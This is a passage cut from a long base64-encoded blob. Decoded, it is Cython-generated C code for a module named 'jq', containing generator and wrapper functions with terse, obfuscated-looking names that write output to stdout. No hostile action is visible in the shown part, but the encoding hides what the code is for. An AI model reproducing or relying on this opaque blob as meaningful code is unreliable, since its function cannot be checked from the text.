hfdF83KSArIDMsIDY1NTM1IHwgX19QeXhfUHlVbmljb2RlX01BWF9DSEFSX1ZBTFVFKF9fcHl4X3RfNSkgfCBfX1B5eF9QeVVuaWNvZGVfTUFYX0NIQVJfVkFMVUUoX19weXhfdF80KSB8IF9fUHl4X1B5VW5pY29kZV9NQVhfQ0hBUl9WQUxVRShfX3B5eF90XzEpIHwgX19QeXhfUHlVbmljb2RlX01BWF9DSEFSX1ZBTFVFKF9fcHl4X3RfNykpO1xuICBpZiAodW5saWtlbHkoIV9fcHl4X3RfMikpIF9fUFlYX0VSUigwLCAxMTYsIF9fcHl4X0wxX2Vycm9yKVxuICBfX1B5eF9HT1RSRUYoX19weXhfdF8yKTtcbiAgX19QeXhfREVDUkVGKF9fcHl4X3RfNSk7IF9fcHl4X3RfNSA9IDA7XG4gIF9fUHl4X0RFQ1JFRihfX3B5eF90XzQpOyBfX3B5eF90XzQgPSAwO1xuICBfX1B5eF9ERUNSRUYoX19weXhfdF8xKTsgX19weXhfdF8xID0gMDtcbiAgX19QeXhfREVDUkVGKF9fcHl4X3RfNyk7IF9fcHl4X3RfNyA9IDA7XG4gIF9fcHl4X3Zfb3V0cHV0ID0gKChQeU9iamVjdCopX19weXhfdF8yKTtcbiAgX19weXhfdF8yID0gMDtcblxuICBcbiAgX19QeXhfR2V0TW9kdWxlR2xvYmFsTmFtZShfX3B5eF90XzEsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X25fdV9zeXMpOyBpZiAodW5saWtlbHkoIV9fcHl4X3RfMSkpIF9fUFlYX0VSUigwLCAxMjIsIF9fcHl4X0wxX2Vycm9yKVxuICBfX1B5eF9HT1RSRUYoX19weXhfdF8xKTtcbiAgX19weXhfdF80ID0gX19QeXhfUHlPYmplY3RfR2V0QXR0clN0cihfX3B5eF90XzEsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X25fdV9zdGRvdXQpOyBpZiAodW5saWtlbHkoIV9fcHl4X3RfNCkpIF9fUFlYX0VSUigwLCAxMjIsIF9fcHl4X0wxX2Vycm9yKVxuICBfX1B5eF9HT1RSRUYoX19weXhfdF80KTtcbiAgX19QeXhfREVDUkVGKF9fcHl4X3RfMSk7IF9fcHl4X3RfMSA9IDA7XG4gIF9fcHl4X3RfNyA9IF9fcHl4X3RfNDtcbiAgX19QeXhfSU5DUkVGKF9fcHl4X3RfNyk7XG4gIF9fcHl4X3RfOSA9IDA7XG4gIHtcbiAgICBQeU9iamVjdCAqX19weXhfY2FsbGFyZ3NbMl0gPSB7X19weXhfdF83LCBfX3B5eF92X291dHB1dH07XG4gICAgX19weXhfdF8yID0gX19QeXhfUHlPYmplY3RfRmFzdENhbGxNZXRob2QoX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfbl91X3dyaXRlLCBfX3B5eF9jYWxsYXJncytfX3B5eF90XzksICgyLV9fcHl4X3RfOSkgfCAoMSpfX1B5eF9QWV9WRUNUT1JDQUxMX0FSR1VNRU5UU19PRkZTRVQpKTtcbiAgICBfX1B5eF9YREVDUkVGKF9fcHl4X3RfNyk7IF9fcHl4X3RfNyA9IDA7XG4gICAgX19QeXhfREVDUkVGKF9fcHl4X3RfNCk7IF9fcHl4X3RfNCA9IDA7XG4gICAgaWYgKHVubGlrZWx5KCFfX3B5eF90XzIpKSBfX1BZWF9FUlIoMCwgMTIyLCBfX3B5eF9MMV9lcnJvcilcbiAgICBfX1B5eF9HT1RSRUYoX19weXhfdF8yKTtcbiAgfVxuICBfX1B5eF9ERUNSRUYoX19weXhfdF8yKTsgX19weXhfdF8yID0gMDtcblxuICBcbiAgX19QeXhfR2V0TW9kdWxlR2xvYmFsTmFtZShfX3B5eF90XzcsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X25fdV9zeXMpOyBpZiAodW5saWtlbHkoIV9fcHl4X3RfNykpIF9fUFlYX0VSUigwLCAxMjMsIF9fcHl4X0wxX2Vycm9yKVxuICBfX1B5eF9HT1RSRUYoX19weXhfdF83KTtcbiAgX19weXhfdF8xID0gX19QeXhfUHlPYmplY3RfR2V0QXR0clN0cihfX3B5eF90XzcsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X25fdV9zdGRvdXQpOyBpZiAodW5saWtlbHkoIV9fcHl4X3RfMSkpIF9fUFlYX0VSUigwLCAxMjMsIF9fcHl4X0wxX2Vycm9yKVxuICBfX1B5eF9HT1RSRUYoX19weXhfdF8xKTtcbiAgX19QeXhfREVDUkVGKF9fcHl4X3RfNyk7IF9fcHl4X3RfNyA9IDA7XG4gIF9fcHl4X3RfNCA9IF9fcHl4X3RfMTtcbiAgX19QeXhfSU5DUkVGKF9fcHl4X3RfNCk7XG4gIF9fcHl4X3RfOSA9IDA7XG4gIHtcbiAgICBQeU9iamVjdCAqX19weXhfY2FsbGFyZ3NbMl0gPSB7X19weXhfdF80LCBOVUxMfTtcbiAgICBfX3B5eF90XzIgPSBfX1B5eF9QeU9iamVjdF9GYXN0Q2FsbE1ldGhvZChfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9uX3VfZmx1c2gsIF9fcHl4X2NhbGxhcmdzK19fcHl4X3RfOSwgKDEtX19weXhfdF85KSB8ICgxKl9fUHl4X1BZX1ZFQ1RPUkNBTExfQVJHVU1FTlRTX09GRlNFVCkpO1xuICAgIF9fUHl4X1hERUNSRUYoX19weXhfdF80KTsgX19weXhfdF80ID0gMDtcbiAgICBfX1B5eF9ERUNSRUYoX19weXhfdF8xKTsgX19weXhfdF8xID0gMDtcbiAgICBpZiAodW5saWtlbHkoIV9fcHl4X3RfMikpIF9fUFlYX0VSUigwLCAxMjMsIF9fcHl4X0wxX2Vycm9yKVxuICAgIF9fUHl4X0dPVFJFRihfX3B5eF90XzIpO1xuICB9XG4gIF9fUHl4X0RFQ1JFRihfX3B5eF90XzIpOyBfX3B5eF90XzIgPSAwO1xuXG4gIFxuXG4gIFxuICBfX3B5eF9yID0gUHlfTm9uZTsgX19QeXhfSU5DUkVGKFB5X05vbmUpO1xuICBnb3RvIF9fcHl4X0wwO1xuICBfX3B5eF9MMV9lcnJvcjo7XG4gIF9fUHl4X1hERUNSRUYoX19weXhfdF8xKTtcbiAgX19QeXhfWERFQ1JFRihfX3B5eF90XzIpO1xuICBfX1B5eF9YREVDUkVGKF9fcHl4X3RfNCk7XG4gIF9fUHl4X1hERUNSRUYoX19weXhfdF81KTtcbiAgX19QeXhfWERFQ1JFRihfX3B5eF90XzYpO1xuICBfX1B5eF9YREVDUkVGKF9fcHl4X3RfNyk7XG4gIF9fUHl4X0FkZFRyYWNlYmFjaygianEucHBwcCIsIF9fcHl4X2NsaW5lbm8sIF9fcHl4X2xpbmVubywgX19weXhfZmlsZW5hbWUpO1xuICBfX3B5eF9yID0gTlVMTDtcbiAgX19weXhfTDA6O1xuICBfX1B5eF9YREVDUkVGKF9fcHl4X3ZfYik7XG4gIF9fUHl4X1hERUNSRUYoX19weXhfdl9ibyk7XG4gIF9fUHl4X1hERUNSRUYoX19weXhfdl9vdXRwdXQpO1xuICBfX1B5eF9YR0lWRVJFRihfX3B5eF9yKTtcbiAgX19QeXhfUmVmTmFubnlGaW5pc2hDb250ZXh0KCk7XG4gIHJldHVybiBfX3B5eF9yO1xufVxuXG5cblxuXG5zdGF0aWMgUHlPYmplY3QgKl9fcHl4X3B3XzJqcV8zdGxsKFB5T2JqZWN0ICpfX3B5eF9zZWxmLCBDWVRIT05fVU5VU0VEIFB5T2JqZWN0ICp1bnVzZWQpOyBcbnN0YXRpYyBQeU1ldGhvZERlZiBfX3B5eF9tZGVmXzJqcV8zdGxsID0geyJ0bGwiLCAoUHlDRnVuY3Rpb24pX19weXhfcHdfMmpxXzN0bGwsIE1FVEhfTk9BUkdTLCAwfTtcbnN0YXRpYyBQeU9iamVjdCAqX19weXhfcHdfMmpxXzN0bGwoUHlPYmplY3QgKl9fcHl4X3NlbGYsIENZVEhPTl9VTlVTRUQgUHlPYmplY3QgKnVudXNlZCkge1xuICBDWVRIT05fVU5VU0VEIFB5T2JqZWN0ICpjb25zdCAqX19weXhfa3d2YWx1ZXM7XG4gIFB5T2JqZWN0ICpfX3B5eF9yID0gMDtcbiAgX19QeXhfUmVmTmFubnlEZWNsYXJhdGlvbnNcbiAgX19QeXhfUmVmTmFubnlTZXR1cENvbnRleHQoInRsbCAod3JhcHBlcikiLCAwKTtcbiAgX19weXhfa3d2YWx1ZXMgPSBfX1B5eF9Ld1ZhbHVlc19WQVJBUkdTKF9fcHl4X2FyZ3MsIF9fcHl4X25hcmdzKTtcbiAgX19weXhfciA9IF9fcHl4X3BmXzJqcV8ydGxsKF9fcHl4X3NlbGYpO1xuXG4gIFxuICBfX1B5eF9SZWZOYW5ueUZpbmlzaENvbnRleHQoKTtcbiAgcmV0dXJuIF9fcHl4X3I7XG59XG5zdGF0aWMgUHlPYmplY3QgKl9fcHl4X2diXzJqcV8zdGxsXzJnZW5lcmF0b3IoX19weXhfQ29yb3V0aW5lT2JqZWN0ICpfX3B5eF9nZW5lcmF0b3IsIENZVEhPTl9VTlVTRUQgUHlUaHJlYWRTdGF0ZSAqX19weXhfdHN0YXRlLCBQeU9iamVjdCAqX19weXhfc2VudF92YWx1ZSk7IFxuXG5cblxuc3RhdGljIFB5T2JqZWN0ICpfX3B5eF9wZl8yanFfM3RsbF9nZW5leHByKENZVEhPTl9VTlVTRUQgUHlPYmplY3QgKl9fcHl4X3NlbGYsIFB5T2JqZWN0ICpfX3B5eF9nZW5leHByX2FyZ18wKSB7XG4gIHN0cnVjdCBfX3B5eF9vYmpfMmpxX19fcHl4X3Njb3BlX3N0cnVjdF9fZ2VuZXhwciAqX19weXhfY3VyX3Njb3BlO1xuICBQeU9iamVjdCAqX19weXhfciA9IE5VTEw7XG4gIF9fUHl4X1JlZk5hbm55RGVjbGFyYXRpb25zXG4gIGludCBfX3B5eF9saW5lbm8gPSAwO1xuICBjb25zdCBjaGFyICpfX3B5eF9maWxlbmFtZSA9IE5VTEw7XG4gIGludCBfX3B5eF9jbGluZW5vID0gMDtcbiAgX19QeXhfUmVmTmFubnlTZXR1cENvbnRleHQoImdlbmV4cHIiLCAwKTtcbiAgX19weXhfY3VyX3Njb3BlID0gKHN0cnVjdCBfX3B5eF9vYmpfMmpxX19fcHl4X3Njb3BlX3N0cnVjdF9fZ2VuZXhwciAqKV9fcHl4X3RwX25ld18yanFfX19weXhfc2NvcGVfc3RydWN0X19nZW5leHByKF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X3B0eXBlXzJqcV9fX3B5eF9zY29wZV9zdHJ1Y3RfX2dlbmV4cHIsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X2VtcHR5X3R1cGxlLCBOVUxMKTtcbiAgaWYgKHVubGlrZWx5KCFfX3B5eF9jdXJfc2NvcGUpKSB7XG4gICAgX19weXhfY3VyX3Njb3BlID0gKChzdHJ1Y3QgX19weXhfb2JqXzJqcV9fX3B5eF9zY29wZV9zdHJ1Y3RfX2dlbmV4cHIgKilQeV9Ob25lKTtcbiAgICBfX1B5eF9JTkNSRUYoUHlfTm9uZSk7XG4gICAgX19QWVhfRVJSKDAsIDEzMSwgX19weXhfTDFfZXJyb3IpXG4gIH0gZWxzZSB7XG4gICAgX19QeXhfR09UUkVGKChQeU9iamVjdCAqKV9fcHl4X2N1cl9zY29wZSk7XG4gIH1cbiAgX19weXhfY3VyX3Njb3BlLT5fX3B5eF9nZW5leHByX2FyZ18wID0gX19weXhfZ2VuZXhwcl9hcmdfMDtcbiAgX19QeXhfSU5DUkVGKF9fcHl4X2N1cl9zY29wZS0+X19weXhfZ2VuZXhwcl9hcmdfMCk7XG4gIF9fUHl4X0dJVkVSRUYoX19weXhfY3VyX3Njb3BlLT5fX3B5eF9nZW5leHByX2FyZ18wKTtcbiAge1xuICAgIF9fcHl4X0Nvcm91dGluZU9iamVjdCAqZ2VuID0gX19QeXhfR2VuZXJhdG9yX05ldygoX19weXhfY29yb3V0aW5lX2JvZHlfdCkgX19weXhfZ2JfMmpxXzN0bGxfMmdlbmVyYXRvciwgKChQeU9iamVjdCAqKV9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X2NvZGVvYmpfdGFiWzBdKSwgKFB5T2JqZWN0ICopIF9fcHl4X2N1cl9zY29wZSwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfbl91X2dlbmV4cHIsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X25fdV90bGxfbG9jYWxzX2dlbmV4cHIsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X25fdV9qcSk7IGlmICh1bmxpa2VseSghZ2VuKSkgX19QWVhfRVJSKDAsIDEzMSwgX19weXhfTDFfZXJyb3IpXG4gICAgX19QeXhfREVDUkVGKF9fcHl4X2N1cl9zY29wZSk7XG4gICAgX19QeXhfUmVmTmFubnlGaW5pc2hDb250ZXh0KCk7XG4gICAgcmV0dXJuIChQeU9iamVjdCAqKSBnZW47XG4gIH1cblxuICBcbiAgX19weXhfTDFfZXJyb3I6O1xuICBfX1B5eF9BZGRUcmFjZWJhY2soImpxLnRsbC5nZW5leHByIiwgX19weXhfY2xpbmVubywgX19weXhfbGluZW5vLCBfX3B5eF9maWxlbmFtZSk7XG4gIF9fcHl4X3IgPSBOVUxMO1xuICBfX1B5eF9ERUNSRUYoKFB5T2JqZWN0ICopX19weXhfY3VyX3Njb3BlKTtcbiAgX19QeXhfWEdJVkVSRUYoX19weXhfcik7XG4gIF9fUHl4X1JlZk5hbm55RmluaXNoQ29udGV4dCgpO1xuICByZXR1cm4gX19weXhfcjtcbn1cblxuc3RhdGljIFB5T2JqZWN0ICpfX3B5eF9nYl8yanFfM3RsbF8yZ2VuZXJhdG9yKF9fcHl4X0Nvcm91dGluZU9iamVjdCAqX19weXhfZ2VuZXJhdG9yLCBDWVRIT05fVU5VU0VEIFB5VGhyZWFkU3RhdGUgKl9fcHl4X3RzdGF0ZSwgUHlPYmplY3QgKl9fcHl4X3NlbnRfdmFsdWUpIFxue1xuICBzdHJ1Y3QgX19weXhfb2JqXzJqcV9fX3B5eF9zY29wZV9zdHJ1Y3RfX2dlbmV4cHIgKl9fcHl4X2N1cl9zY29wZSA9ICgoc3RydWN0IF9fcHl4X29ial8yanFfX19weXhfc2NvcGVfc3RydWN0X19nZW5leHByICopX19weXhfZ2VuZXJhdG9yLT5jbG9zdXJlKTtcbiAgUHlPYmplY3QgKl9fcHl4X3IgPSBOVUxMO1xuICBQeU9iamVjdCAqX19weXhfdF8xID0gTlVMTDtcbiAgUHlfc3NpemVfdCBfX3B5eF90XzI7XG4gIFB5T2JqZWN0ICooKl9fcHl4X3RfMykoUHlPYmplY3QgKik7XG4gIFB5T2JqZWN0ICpfX3B5eF90XzQgPSBOVUxMO1xuICBQeU9iamVjdCAqX19weXhfdF81ID0gTlVMTDtcbiAgUHlPYmplY3QgKl9fcHl4X3RfNiA9IE5VTEw7XG4gIFB5T2JqZWN0ICpfX3B5eF90XzcgPSBOVUxMO1xuICBzaXplX3QgX19weXhfdF84O1xuICBpbnQgX19weXhfbGluZW5vID0gMDtcbiAgY29uc3QgY2hhciAqX19weXhfZmlsZW5hbWUgPSBOVUxMO1xuICBpbnQgX19weXhfY2xpbmVubyA9IDA7XG4gIF9fUHl4X1JlZk5hbm55RGVjbGFyYXRpb25zXG4gIF9fUHl4X1JlZk5hbm55U2V0dXBDb250ZXh0KCJnZW5leHByIiwgMCk7XG4gIHN3aXRjaCAoX19weXhfZ2VuZXJhdG9yLT5yZXN1bWVfbGFiZWwpIHtcbiAgICBjYXNlIDA6IGdvdG8gX19weXhfTDNfZmlyc3RfcnVuO1xuICAgIGRlZmF1bHQ6IFxuICAgIF9fUHl4X1JlZk5hbm55RmluaXNoQ29udGV4dCgpO1xuICAgIHJldHVybiBOVUxMO1xuICB9XG4gIF9fcHl4X0wzX2ZpcnN0X3J1bjo7XG4gIGlmICh1bmxpa2VseSghX19weXhfc2VudF92YWx1ZSkpIF9fUFlYX0VSUigwLCAxMzEsIF9fcHl4X0wxX2Vycm9yKVxuICBfX3B5eF9yID0gUHlMaXN0X05ldygwKTsgaWYgKHVubGlrZWx5KCFfX3B5eF9yKSkgX19QWVhfRVJSKDAsIDEzMSwgX19weXhfTDFfZXJyb3IpXG4gIF9fUHl4X0dPVFJFRihfX3B5eF9yKTtcbiAgaWYgKHVubGlrZWx5KCFfX3B5eF9jdXJfc2NvcGUtPl9fcHl4X2dlbmV4cHJfYXJnXzApKSB7IF9fUHl4X1JhaXNlVW5ib3VuZExvY2FsRXJyb3IoIi4wIik7IF9fUFlYX0VSUigwLCAxMzEsIF9fcHl4X0wxX2Vycm9yKSB9XG4gIGlmIChsaWtlbHkoUHlMaXN0X0NoZWNrRXhhY3QoX19weXhfY3VyX3Njb3BlLT5fX3B5eF9nZW5leHByX2FyZ18wKSkgfHwgUHlUdXBsZV9DaGVja0V4YWN0KF9fcHl4X2N1cl9zY29wZS0+X19weXhfZ2VuZXhwcl9hcmdfMCkpIHtcbiAgICBfX3B5eF90XzEgPSBfX3B5eF9jdXJfc2NvcGUtPl9fcHl4X2dlbmV4cHJfYXJnXzA7IF9fUHl4X0lOQ1JFRihfX3B5eF90XzEpO1xuICAgIF9fcHl4X3RfMiA9IDA7XG4gICAgX19weXhfdF8zID0gTlVMTDtcbiAgfSBlbHNlIHtcbiAgICBfX3B5eF90XzIgPSAtMTsgX19weXhfdF8xID0gUHlPYmplY3RfR2V0SXRlcihfX3B5eF9jdXJfc2NvcGUtPl9fcHl4X2dlbmV4cHJfYXJnXzApOyBpZiAodW5saWtlbHkoIV9fcHl4X3RfMSkpIF9fUFlYX0VSUigwLCAxMzEsIF9fcHl4X0wxX2Vycm9yKVxuICAgIF9fUHl4X0dPVFJFRihfX3B5eF90XzEpO1xuICAgIF9fcHl4X3RfMyA9IChDWVRIT05fQ09NUElMSU5HX0lOX0xJTUlURURfQVBJKSA/IFB5SXRlcl9OZXh0IDogX19QeXhfUHlPYmplY3RfR2V0SXRlck5leHRGdW5jKF9fcHl4X3RfMSk7IGlmICh1bmxpa2VseSghX19weXhfdF8zKSkgX19QWVhfRVJSKDAsIDEzMSwgX19weXhfTDFfZXJyb3IpXG4gIH1cbiAgZm9yICg7Oykge1xuICAgIGlmIChsaWtlbHkoIV9fcHl4X3RfMykpIHtcbiAgICAgIGlmIChsaWtlbHkoUHlMaXN0X0NoZWNrRXhhY3QoX19weXhfdF8xKSkpIHtcbiAgICAgICAge1xuICAgICAgICAgIFB5X3NzaXplX3QgX19weXhfdGVtcCA9IF9fUHl4X1B5TGlzdF9HRVRfU0laRShfX3B5eF90XzEpO1xuICAgICAgICAgICNpZiAhQ1lUSE9OX0FTU1VNRV9TQUZFX1NJWkVcbiAgICAgICAgICBpZiAodW5saWtlbHkoKF9fcHl4X3RlbXAgPCAwKSkpIF9fUFlYX0VSUigwLCAxMzEsIF9fcHl4X0wxX2Vycm9yKVxuICAgICAgICAgICNlbmRpZlxuICAgICAgICAgIGlmIChfX3B5eF90XzIgPj0gX19weXhfdGVtcCkgYnJlYWs7XG4gICAgICAgIH1cbiAgICAgICAgX19weXhfdF80ID0gX19QeXhfUHlMaXN0X0dldEl0ZW1SZWYoX19weXhfdF8xLCBfX3B5eF90XzIpO1xuICAgICAgICArK19fcHl4X3RfMjtcbiAgICAgIH0gZWxzZSB7XG4gICAgICAgIHtcbiAgICAgICAgICBQeV9zc2l6ZV90IF9fcHl4X3RlbXAgPSBfX1B5eF9QeVR1cGxlX0dFVF9TSVpFKF9fcHl4X3RfMSk7XG4gICAgICAgICAgI2lmICFDWVRIT05fQVNTVU1FX1NBRkVfU0laRVxuICAgICAgICAgIGlmICh1bmxpa2VseSgoX19weXhfdGVtcCA8IDApKSkgX19QWVhfRVJSKDAsIDEzMSwgX19weXhfTDFfZXJyb3IpXG4gICAgICAgICAgI2VuZGlmXG4gICAgICAgICAgaWYgKF9fcHl4X3RfMiA+PSBfX3B5eF90ZW1wKSBicmVhaztcbiAgICAgICAgfVxuICAgICAgICAjaWYgQ1lUSE9OX0FTU1VNRV9TQUZFX01BQ1JPUyAmJiAhQ1lUSE9OX0FWT0lEX0JPUlJPV0VEX1JFRlNcbiAgICAgICAgX19weXhfdF80ID0gX19QeXhfTmV3UmVmKFB5VHVwbGVfR0VUX0lURU0oX19weXhfdF8xLCBfX3B5eF90XzIpKTtcbiAgICAgICAgI2Vsc2VcbiAgICAgICAgX19weXhfdF80ID0gX19QeXhfUHlTZXF1ZW5jZV9JVEVNKF9fcHl4X3RfMSwgX19weXhfdF8yKTtcbiAgICAgICAgI2VuZGlmXG4gICAgICAgICsrX19weXhfdF8yO1xuICAgICAgfVxuICAgICAgaWYgKHVubGlrZWx5KCFfX3B5eF90XzQpKSBfX1BZWF9FUlIoMCwgMTMxLCBfX3B5eF9MMV9lcnJvcilcbiAgICB9IGVsc2Uge1xuICAgICAgX19weXhfdF80ID0gX19weXhfdF8zKF9fcHl4X3RfMSk7XG4gICAgICBpZiAodW5saWtlbHkoIV9fcHl4X3RfNCkpIHtcbiAgICAgICAgUHlPYmplY3QqIGV4Y190eXBlID0gUHlFcnJfT2NjdXJyZWQoKTtcbiAgICAgICAgaWYgKGV4Y190eXBlKSB7XG4gICAgICAgICAgaWYgKHVubGlrZWx5KCFfX1B5eF9QeUVycl9HaXZlbkV4Y2VwdGlvbk1hdGNoZXMoZXhjX3R5cGUsIFB5RXhjX1N0b3BJdGVyYXRpb24pKSkgX19QWVhfRVJSKDAsIDEzMSwgX19weXhfTDFfZXJyb3IpXG4gICAgICAgICAgUHlFcnJfQ2xlYXIoKTtcbiAgICAgICAgfVxuICAgICAgICBicmVhaztcbiAgICAgIH1cbiAgICB9XG4gICAgX19QeXhfR09UUkVGKF9fcHl4X3RfNCk7XG4gICAgX19QeXhfWEdPVFJFRihfX3B5eF9jdXJfc2NvcGUtPl9fcHl4X3ZfaSk7XG4gICAgX19QeXhfWERFQ1JFRl9TRVQoX19weXhfY3VyX3Njb3BlLT5fX3B5eF92X2ksIF9fcHl4X3RfNCk7XG4gICAgX19QeXhfR0lWRVJFRihfX3B5eF90XzQpO1xuICAgIF9fcHl4X3RfNCA9IDA7XG4gICAgX19weXhfdF81ID0gTlVMTDtcbiAgICBfX1B5eF9HZXRNb2R1bGVHbG9iYWxOYW1lKF9fcHl4X3RfNiwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfbl91X2NjKTsgaWYgKHVubGlrZWx5KCFfX3B5eF90XzYpKSBfX1BZWF9FUlIoMCwgMTMxLCBfX3B5eF9MMV9lcnJvcilcbiAgICBfX1B5eF9HT1RSRUYoX19weXhfdF82KTtcbiAgICBfX1B5eF9HZXRNb2R1bGVHbG9iYWxOYW1lKF9fcHl4X3RfNywgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfbl91X3l5KTsgaWYgKHVubGlrZWx5KCFfX3B5eF90XzcpKSBfX1BZWF9FUlIoMCwgMTMxLCBfX3B5eF9MMV9lcnJvcilcbiAgICBfX1B5eF9HT1RSRUYoX19weXhfdF83KTtcbiAgICBfX3B5eF90XzggPSAxO1xuICAgICNpZiBDWVRIT05fVU5QQUNLX01FVEhPRFNcbiAgICBpZiAodW5saWtlbHkoUHlNZXRob2RfQ2hlY2soX19weXhfdF82KSkpIHtcbiAgICAgIF9fcHl4X3RfNSA9IFB5TWV0aG9kX0dFVF9TRUxGKF9fcHl4X3RfNik7XG4gICAgICBhc3NlcnQoX19weXhfdF81KTtcbiAgICAgIFB5T2JqZWN0KiBfX3B5eF9fZnVuY3Rpb24gPSBQeU1ldGhvZF9HRVRfRlVOQ1RJT04oX19weXhfdF82KTtcbiAgICAgIF9fUHl4X0lOQ1JFRihfX3B5eF90XzUpO1xuICAgICAgX19QeXhfSU5DUkVGKF9fcHl4X19mdW5jdGlvbik7XG4gICAgICBfX1B5eF9ERUNSRUZfU0VUKF9fcHl4X3RfNiwgX19weXhfX2Z1bmN0aW9uKTtcbiAgICAgIF9fcHl4X3RfOCA9IDA7XG4gICAgfVxuICAgICNlbmRpZlxuICAgIHtcbiAgICAgIFB5T2JqZWN0ICpfX3B5eF9jYWxsYXJnc1syXSA9IHtfX3B5eF90XzUsIF9fcHl4X3RfN307XG4gICAgICBfX3B5eF90XzQgPSBfX1B5eF9QeU9iamVjdF9GYXN0Q2FsbChfX3B5eF90XzYsIF9fcHl4X2NhbGxhcmdzK19fcHl4X3RfOCwgKDItX19weXhfdF84KSB8IChfX3B5eF90XzgqX19QeXhfUFlfVkVDVE9SQ0FMTF9BUkdVTUVOVFNfT0ZGU0VUKSk7XG4gICAgICBfX1B5eF9YREVDUkVGKF9fcHl4X3RfNSk7IF9fcHl4X3RfNSA9IDA7XG4gICAgICBfX1B5eF9ERUNSRUYoX19weXhfdF83KTsgX19weXhfdF83ID0gMDtcbiAgICAgIF9fUHl4X0RFQ1JFRihfX3B5eF90XzYpOyBfX3B5eF90XzYgPSAwO1xuICAgICAgaWYgKHVubGlrZWx5KCFfX3B5eF90XzQpKSBfX1BZWF9FUlIoMCwgMTMxLCBfX3B5eF9MMV9lcnJvcilcbiAgICAgIF9fUHl4X0dPVFJFRihfX3B5eF90XzQpO1xuICAgIH1cbiAgICBpZiAodW5saWtlbHkoX19QeXhfTGlzdENvbXBfQXBwZW5kKF9fcHl4X3IsIChQeU9iamVjdCopX19weXhfdF80KSkpIF9fUFlYX0VSUigwLCAxMzEsIF9fcHl4X0wxX2Vycm9yKVxuICAgIF9fUHl4X0RFQ1JFRihfX3B5eF90XzQpOyBfX3B5eF90XzQgPSAwO1xuICB9XG4gIF9fUHl4X0RFQ1JFRihfX3B5eF90XzEpOyBfX3B5eF90XzEgPSAwO1xuICBDWVRIT05fTUFZQkVfVU5VU0VEX1ZBUihfX3B5eF9jdXJfc2NvcGUpO1xuXG4gIFxuICBnb3RvIF9fcHl4X0wwO1xuICBfX3B5eF9MMV9lcnJvcjo7XG4gIF9fUHl4X1hERUNSRUYoX19weXhfcik7IF9fcHl4X3IgPSAwO1xuICBfX1B5eF9YREVDUkVGKF9fcHl4X3RfMSk7XG4gIF9fUHl4X1hERUNSRUYoX19weXhfdF80KTtcbiAgX19QeXhfWERFQ1JFRihfX3B5eF90XzUpO1xuICBfX1B5eF9YREVDUkVGKF9fcHl4X3RfNik7XG4gIF9fUHl4X1hERUNSRUYoX19weXhfdF83KTtcbiAgaWYgKF9fUHl4X1B5RXJyX09jY3VycmVkKCkpIHtcbiAgICBfX1B5eF9HZW5lcmF0b3JfUmVwbGFjZV9TdG9wSXRlcmF0aW9uKDApO1xuICAgIF9fUHl4X0FkZFRyYWNlYmFjaygiZ2VuZXhwciIsIF9fcHl4X2NsaW5lbm8sIF9fcHl4X2xpbmVubywgX19weXhfZmlsZW5hbWUpO1xuICB9XG4gIF9fcHl4X0wwOjtcbiAgX19QeXhfWEdJVkVSRUYoX19weXhfcik7XG4gICNpZiAhQ1lUSE9OX1VTRV9FWENfSU5GT19TVEFDS1xuICBfX1B5eF9Db3JvdXRpbmVfUmVzZXRBbmRDbGVhckV4Y2VwdGlvbihfX3B5eF9nZW5lcmF0b3IpO1xuICAjZW5kaWZcbiAgX19weXhfZ2VuZXJhdG9yLT5yZXN1bWVfbGFiZWwgPSAtMTtcbiAgX19QeXhfQ29yb3V0aW5lX2NsZWFyKChQeU9iamVjdCopX19weXhfZ2VuZXJhdG9yKTtcbiAgX19QeXhfUmVmTmFubnlGaW5pc2hDb250ZXh0KCk7XG4gIHJldHVybiBfX3B5eF9yO1xufVxuc3RhdGljIFB5T2JqZWN0ICpfX3B5eF9nYl8yanFfM3RsbF81Z2VuZXJhdG9yMShfX3B5eF9Db3JvdXRpbmVPYmplY3QgKl9fcHl4X2dlbmVyYXRvciwgQ1lUSE9OX1VOVVNFRCBQeVRocmVhZFN0YXRlICpfX3B5eF90c3RhdGUsIFB5T2JqZWN0ICpfX3B5eF9zZW50X3ZhbHVlKTsgXG5cblxuXG5zdGF0aWMgUHlPYmplY3QgKl9fcHl4X3BmXzJqcV8zdGxsXzNnZW5leHByKENZVEhPTl9VTlVTRUQgUHlPYmplY3QgKl9fcHl4X3NlbGYsIFB5T2JqZWN0ICpfX3B5eF9nZW5leHByX2FyZ18wKSB7XG4gIHN0cnVjdCBfX3B5eF9vYmpfMmpxX19fcHl4X3Njb3BlX3N0cnVjdF8xX2dlbmV4cHIgKl9fcHl4X2N1cl9zY29wZTtcbiAgUHlPYmplY3QgKl9fcHl4X3IgPSBOVUxMO1xuICBfX1B5eF9SZWZOYW5ueURlY2xhcmF0aW9uc1xuICBpbnQgX19weXhfbGluZW5vID0gMDtcbiAgY29uc3QgY2hhciAqX19weXhfZmlsZW5hbWUgPSBOVUxMO1xuICBpbnQgX19weXhfY2xpbmVubyA9IDA7XG4gIF9fUHl4X1JlZk5hbm55U2V0dXBDb250ZXh0KCJnZW5leHByIiwgMCk7XG4gIF9fcHl4X2N1cl9zY29wZSA9IChzdHJ1Y3QgX19weXhfb2JqXzJqcV9fX3B5eF9zY29wZV9zdHJ1Y3RfMV9nZW5leHByICopX19weXhfdHBfbmV3XzJqcV9fX3B5eF9zY29wZV9zdHJ1Y3RfMV9nZW5leHByKF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X3B0eXBlXzJqcV9fX3B5eF9zY29wZV9zdHJ1Y3RfMV9nZW5leHByLCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9lbXB0eV90dXBsZSwgTlVMTCk7XG4gIGlmICh1bmxpa2VseSghX19weXhfY3Vy